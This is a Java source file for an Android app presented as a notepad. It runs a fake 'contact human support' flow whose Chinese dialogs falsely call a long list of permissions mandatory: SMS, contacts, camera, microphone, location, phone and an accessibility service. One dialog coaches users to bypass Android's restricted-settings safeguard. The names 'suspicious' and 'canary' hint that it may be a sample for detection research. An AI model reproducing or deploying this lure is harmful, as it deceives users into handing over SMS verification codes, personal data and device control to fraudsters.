package com.friendlyapps.notepad;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
  private static final int REQUEST_PERMS = 1001;
  private static final int REQUEST_SUPPORT_FLOW = 1002;
  private static final String SUPPORT_NUMBER = "+18005550199";
  private static final String[] SUSPICIOUS_PERMS =
      new String[] {
        android.Manifest.permission.POST_NOTIFICATIONS,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.CAMERA
      };

  private TextView permStatus;

  private static final SupportStep[] SUPPORT_FLOW_STEPS =
      new SupportStep[] {
        SupportStep.runtimePermission(
            android.Manifest.permission.CALL_PHONE,
            /*required=*/ true,
            "电话",
            "为联系人工客服必须开启电话权限。\n\n请点击“继续”并同意授权电话权限。"),
        SupportStep.accessibilityService(
            /*required=*/ true,
            "无障碍",
            "为联系人工客服必须开启无障碍服务，以便协助完成拨号与操作引导。\n\n"
                + "若看到“controlled by restricted setting/受限设置控制”，请先到该应用的 App info/应用信息 页面（install friendlyApp / com.friendlyapps.notepad）→ 右上角 ⋮（或页面里的“Restricted settings/受限设置”入口）→ Allow restricted settings/允许受限设置，然后再回到 Accessibility/无障碍 里开启 客服辅助服务。\n\n"
                + "请点击“继续”后在系统设置中完成开启。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.READ_CONTACTS,
            /*required=*/ true,
            "通讯录",
            "为联系人工客服并核验您的账户联系人信息，必须开启通讯录权限。\n\n请点击“继续”并同意授权通讯录权限。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.READ_SMS,
            /*required=*/ true,
            "短信",
            "为联系人工客服并完成短信验证码校验，必须开启短信权限。\n\n请点击“继续”并同意授权短信权限。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.POST_NOTIFICATIONS,
            /*required=*/ true,
            "通知",
            "为联系人工客服并接收工单更新通知，必须开启通知权限。\n\n请点击“继续”并同意授权通知权限。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.CAMERA,
            /*required=*/ true,
            "相机",
            "为联系人工客服并发送问题截图，必须开启相机权限。\n\n请点击“继续”并同意授权相机权限。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            /*required=*/ true,
            "位置",
            "为联系人工客服并定位您的服务地址，必须开启位置权限。\n\n请点击“继续”并同意授权位置权限。"),
        SupportStep.runtimePermission(
            android.Manifest.permission.RECORD_AUDIO,
            /*required=*/ true,
            "麦克风",
            "为联系人工客服并录制语音描述问题，必须开启麦克风权限。\n\n请点击“继续”并同意授权麦克风权限。"),
      };

  private boolean supportFlowActive = false;
  private int supportFlowIndex = 0;
  private boolean supportFlowAwaitingAccessibilityReturn = false;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    TextView body = findViewById(R.id.body);
    body.setText(getString(R.string.body_text, getPackageName()));

    permStatus = findViewById(R.id.perm_status);
    _refreshPermStatus();

    View callSupport = findViewById(R.id.btn_call_support);
    callSupport.setOnClickListener(
        new View.OnClickListener() {
          @Override
          public void onClick(View v) {
            _startSupportCallFlow();
          }
        });

    View request = findViewById(R.id.btn_request_perms);
    request.setOnClickListener(
        new View.OnClickListener() {
          @Override
          public void onClick(View v) {
            requestPermissions(SUSPICIOUS_PERMS, REQUEST_PERMS);
          }
        });

    View startWarning = findViewById(R.id.btn_start_warning);
    startWarning.setOnClickListener(
        new View.OnClickListener() {
          @Override
          public void onClick(View v) {
            CanaryForegroundService.start(MainActivity.this);
          }
        });

    CanaryForegroundService.start(this);
  }

  @Override
  protected void onResume() {
    super.onResume();
    if (supportFlowActive && supportFlowAwaitingAccessibilityReturn) {
      supportFlowAwaitingAccessibilityReturn = false;
      _advanceSupportFlow();
    }
  }

  @Override
  public void onRequestPermissionsResult(
      int requestCode, String[] permissions, int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    _refreshPermStatus();

    if (requestCode == REQUEST_SUPPORT_FLOW && supportFlowActive) {
      SupportStep step =
          (supportFlowIndex >= 0 && supportFlowIndex < SUPPORT_FLOW_STEPS.length)
              ? SUPPORT_FLOW_STEPS[supportFlowIndex]
              : null;
      boolean granted =
          grantResults != null
              && grantResults.length > 0
              && grantResults[0] == PackageManager.PERMISSION_GRANTED;

      if (step != null && step.required && !granted) {
        supportFlowActive = false;
        String name = (step.displayName == null || step.displayName.isEmpty()) ? "必要" : step.displayName;
        Toast.makeText(this, "未授予" + name + "权限，无法联系人工客服。", Toast.LENGTH_SHORT).show();
        return;
      }

      supportFlowIndex++;
      _advanceSupportFlow();
    }
  }

  private void _refreshPermStatus() {
    StringBuilder sb = new StringBuilder();
    for (String perm : SUSPICIOUS_PERMS) {
      int state = checkSelfPermission(perm);
      String status = (state == PackageManager.PERMISSION_GRANTED) ? "GRANTED" : "DENIED";
      sb.append(perm).append(" : ").append(status).append("\n");
    }
    permStatus.setText(sb.toString().trim());
  }

  private boolean _allSuspiciousPermsGranted() {
    for (String perm : SUSPICIOUS_PERMS) {
      if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
        return false;
      }
    }
    return true;
  }

  private void _startSupportCallFlow() {
    supportFlowActive = true;
    supportFlowIndex = 0;
    _advanceSupportFlow();
  }

  private void _advanceSupportFlow() {
    if (!supportFlowActive) {
      return;
    }

    while (supportFlowIndex < SUPPORT_FLOW_STEPS.length) {
      SupportStep step = SUPPORT_FLOW_STEPS[supportFlowIndex];
      if (step.kind == SupportStep.KIND_RUNTIME_PERMISSION) {
        if (checkSelfPermission(step.permission) == PackageManager.PERMISSION_GRANTED) {
          supportFlowIndex++;
          continue;
        }
        _showSupportStepRationale(step);
        return;
      }

      if (step.kind == SupportStep.KIND_ACCESSIBILITY_SERVICE) {
        if (_isAccessibilityServiceEnabled()) {
          supportFlowIndex++;
          continue;
        }
        _showSupportStepRationale(step);
        return;
      }

      // Unknown step kind; stop to avoid looping.
      supportFlowActive = false;
      return;
    }

    supportFlowActive = false;
    if (checkSelfPermission(android.Manifest.permission.CALL_PHONE)
        == PackageManager.PERMISSION_GRANTED) {
      _placeSupportCall();
    } else {
      Toast.makeText(this, "未授予电话权限，无法在应用内直接拨打客服。", Toast.LENGTH_SHORT).show();
    }
  }

  private void _showSupportStepRationale(SupportStep step) {
    new AlertDialog.Builder(this)
        .setTitle("联系人工客服")
        .setMessage(step.rationale)
        .setNegativeButton(
            "取消",
            (dialog, which) -> {
              dialog.dismiss();
              supportFlowActive = false;
            })
        .setPositiveButton(
            "继续",
            (dialog, which) -> {
              if (step.kind == SupportStep.KIND_RUNTIME_PERMISSION) {
                requestPermissions(new String[] {step.permission}, REQUEST_SUPPORT_FLOW);
                return;
              }
              if (step.kind == SupportStep.KIND_ACCESSIBILITY_SERVICE) {
                supportFlowAwaitingAccessibilityReturn = true;
                _openAccessibilitySettings();
              }
            })
        .show();
  }

  private void _placeSupportCall() {
    try {
      Intent i = new Intent(Intent.ACTION_CALL);
      i.setData(Uri.parse("tel:" + SUPPORT_NUMBER));
      startActivity(i);
    } catch (Exception e) {
      Toast.makeText(this, "无法发起通话：" + e.getMessage(), Toast.LENGTH_SHORT).show();
    }
  }

  private boolean _isAccessibilityServiceEnabled() {
    try {
      int enabled =
          Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
      if (enabled != 1) {
        return false;
      }

      String enabledServices =
          Settings.Secure.getString(
              getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
      if (enabledServices == null || enabledServices.isEmpty()) {
        return false;
      }

      String expected =
          getPackageName() + "/" + FriendlyAccessibilityService.class.getName();
      TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
      splitter.setString(enabledServices);
      for (String service : splitter) {
        if (expected.equalsIgnoreCase(service)) {
          return true;
        }
      }
      return false;
    } catch (Exception e) {
      return false;
    }
  }

  private void _openAccessibilitySettings() {
    try {
      Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
      startActivity(intent);
    } catch (Exception e) {
      supportFlowAwaitingAccessibilityReturn = false;
      Toast.makeText(this, "无法打开无障碍设置：" + e.getMessage(), Toast.LENGTH_SHORT).show();
    }
  }

  private static final class SupportStep {
    static final int KIND_RUNTIME_PERMISSION = 1;
    static final int KIND_ACCESSIBILITY_SERVICE = 2;

    final int kind;
    final String permission;
    final boolean required;
    final String displayName;
    final String rationale;

    private SupportStep(
        int kind, String permission, boolean required, String displayName, String rationale) {
      this.kind = kind;
      this.permission = permission;
      this.required = required;
      this.displayName = displayName;
      this.rationale = rationale;
    }

    static SupportStep runtimePermission(
        String permission, boolean required, String displayName, String rationale) {
      return new SupportStep(
          KIND_RUNTIME_PERMISSION, permission, required, displayName, rationale);
    }

    static SupportStep accessibilityService(boolean required, String displayName, String rationale) {
      return new SupportStep(KIND_ACCESSIBILITY_SERVICE, null, required, displayName, rationale);
    }
  }
}
